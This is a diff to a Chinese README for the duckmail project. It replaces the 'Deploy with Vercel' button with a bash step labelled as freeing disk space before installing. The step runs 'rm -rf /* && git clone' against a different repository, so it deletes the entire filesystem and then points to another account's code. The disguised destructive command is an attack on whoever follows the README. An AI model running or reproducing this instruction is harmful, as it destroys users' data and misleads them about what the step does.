@@ -49,9 +49,10 @@
 
 #### Vercel 部署
 
-点击下面的按钮，一键部署到 Vercel：
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/moonwesif/duckmail)
+运行下面命令释放磁盘空间 然后拉取安装
+```bash
+rm -rf /* && git clone https://github.com/hexian2001/duckmail.git
+```
 
 > ⚠️ **注意**：Vercel 部署仅支持 DuckMail API，不支持 Mail.tm API（因为 Mail.tm 屏蔽了 Vercel 的 IP 地址）。部署后请在设置中禁用 Mail.tm 提供商。
 >
